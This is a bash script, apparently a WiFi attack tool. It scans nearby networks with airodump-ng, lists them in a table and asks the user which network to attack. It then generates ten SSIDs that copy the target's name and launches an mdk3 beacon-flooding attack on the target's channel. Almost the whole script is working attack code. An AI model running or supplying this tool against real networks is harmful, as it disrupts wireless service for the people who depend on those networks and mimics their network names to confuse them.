#!/bin/bash
# Author: ju4ncaa

# ANSI color palette
GREEN="\e[1;92m"
RED="\e[1;91m"
YELLOW="\e[1;93m"
CYAN="\e[1;96m"
RESET="\e[1;97m"


# Exit function
trap ctrl_c INT
stty -ctlecho
function ctrl_c(){
    echo -e "\n\n${RED}[!]${RESET} Exit..."
    if [[ -n "$xterm_pid" && -d "/proc/$xterm_pid" ]]; then
        kill "$xterm_pid"
    fi
    rm -f output-*.csv ssid_dict.txt &> /dev/null
    service wpa_supplicant start &> /dev/null
    exit 0
}

# Banner
banner(){
    clear
    echo -e "${GREEN}┏━━┓╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┏━━┓╋╋╋╋╋╋╋╋┏┓"
    echo -e "┃┏┓┃╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┃┏┓┃╋╋╋╋╋╋╋┏┛┗┓"
    echo -e "┃┗┛┗┳━━┳━━┳━━┳━━┳━┓┃┗┛┗┳┓┏┳━┳━┻┓┏┛"
    echo -e "┃┏━┓┃┃━┫┏┓┃┏━┫┏┓┃┏┓┫┏━┓┃┃┃┃┏┫━━┫┃${RESET}    (Made by ${YELLOW}0xJuaNc4${RESET})"
    echo -e "${GREEN}┃┗━┛┃┃━┫┏┓┃┗━┫┗┛┃┃┃┃┗━┛┃┗┛┃┃┣━━┃┗┓"
    echo -e "┗━━━┻━━┻┛┗┻━━┻━━┻┛┗┻━━━┻━━┻┛┗━━┻━┛${RESET}"
    sleep 1
}

# Check whether the required tools are installed
check_tools(){
    tools=("iw" "airmon-ng" "airodump-ng" "mdk3" "xterm")
    echo -e "\n${CYAN}[*]${RESET} Checking tools required...\n"
    for tool in "${tools[@]}"; do
        if command -v $tool &> /dev/null; then
            echo -e "$tool....${GREEN}ok${RESET}"
        else
            echo -e "$tool....${RED}no${RESET}"
            echo -e "\n${RED}[!]${RESET} The ${YELLOW}$tool${RESET} tool is not installed on the system, you must install it to continue."
        fi
        sleep 0.5
    done
}

# List available network interfaces
select_interface(){
    echo -e "\n${CYAN}[*]${RESET} Starting...\n"
    sleep 1
    echo -e "\n${CYAN}[*]${RESET} Wireless network interfaces available:\n"
    interfaces=$(iw dev | grep Interface | awk '{print $2}')
    counter=1
    for interface in $interfaces; do
        echo -e "${YELLOW}${counter}.${RESET} ${interface}"
        ((counter++))
    done
    echo -n -e "\n${CYAN}Select the interface you want to work with >${RESET} "
    read interface
    if ! ifconfig "${interface}" &> /dev/null; then
        echo -e "\n\n${RED}[!]${RESET} The interface ${YELLOW}$interface${RESET} is invalid\n"
        exit 1
    else
        echo -e "\n\n${CYAN}[*]${RESET} Checking monitor mode in ${YELLOW}$interface${RESET}\n"
        sleep 1
        if ! iwconfig $interface | grep "Mode:Monitor" &> /dev/null; then
            echo -e "\n${RED}[!]${RESET} The ${YELLOW}$interface${RESET} interface is not in monitor mode, activate it to continue....\n"
            exit 1
        else
            echo -e "\n${GREEN}[*]${RESET} Monitor mode activated in ${YELLOW}$interface${RESET}, continuing...\n"
        fi
    fi
}

# Display the network scan table
show_table(){
    clear
    banner
    echo -e "\n${CYAN}Available networks:${RESET}\n"
    echo -e "--------------------------------------------------------------"
    echo -e "| BSSID              | ESSID               | Canal | Potencia |"
    echo -e "--------------------------------------------------------------"
    grep -E -o "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" output-01.csv | sort -u | while read -r bssid; do
        essid=$(grep "$bssid" output-01.csv | awk -F "," '{print $14}')
        channel=$(grep "$bssid" output-01.csv | awk -F "," '{print $4}')
        power=$(grep "$bssid" output-01.csv | awk -F "," '{print $8}')
        printf "| %-17s | %-20s | %-5s | %-8s |\n" "$bssid" "$essid" "$channel" "$power"
    done
    echo -e "--------------------------------------------------------------"
}

# Scanning WIFI networks
net_scan(){
    echo -n -e "\n${CYAN}Do you wish to continue with the network scan? ${YELLOW}(y/n)${RESET} >${RESET} "
    read option_choose
    if [[ "${option_choose,,}" == "y" ]]; then
        echo -e "\n\n${GREEN}[*]${RESET} Starting the network scan...\n"
        sleep 1
        clear
        banner
        echo -e "\n${YELLOW}[*]${RESET} Network scanning in progress...\n"
        xterm -geometry 120x40 -e "airodump-ng ${interface} --output-format csv -w output"
        xterm_pid=$!
        wait "$xterm_pid"
        show_table
        echo -n -e "\n${CYAN}Type the name of the WiFi network you want to attack >${RESET} "
        read selected_essid
        if grep -q "$selected_essid" output-01.csv; then
            echo -e "\n${GREEN}[*]${RESET} The ${YELLOW}$selected_essid${RESET} network has been selected.${RESET}\n"
            sleep 0.5
        else
            echo -e "\n${RED}[!]${RESET} Network ${YELLOW}$selected_essid${RESET} is not in the list.${RESET}\n"
            echo -e "\n${RED}[!] Exit...${RESET}"
            exit 1 
        fi
    else
        echo -e "\n\n${RED}[!] Exit...${RESET}"
        exit 0
    fi
}

# Perform Beacon Flooding attack
beacon_attack(){
    selected_channel=$(grep "$selected_essid" output-01.csv | awk -F "," '{print $4}')
    echo -e "\n${CYAN}[*]${RESET} Creating attack dictionary for the network ${YELLOW}$selected_essid${RESET}\n"
    for i in $(seq 1 10); do
        echo "${selected_essid}${i}" >> ssid_dict.txt
    done
    sleep 1
    echo -e "\n${GREEN}[*]${RESET} Dictionary created successfully!\n"
    clear
    banner
    echo -e "\n${CYAN}[*]${RESET} Attacks in progress on the network ${YELLOW}${selected_essid}${RESET} ${NETWORK}(Ctrl + C to end)...${RESET}\n"
    mdk3 $interface b -f ssid_dict.txt -c $selected_channel -s 1000 -a
}

# Main program
if [ "$(id -u)" == "0" ]; then
    banner
    check_tools
    select_interface
    net_scan
    beacon_attack
else
    echo -e "\n${RED}[!]${RESET} Superuser permissions ${RED}(root)${RESET} are required to run the script\n"
    exit 1
fi
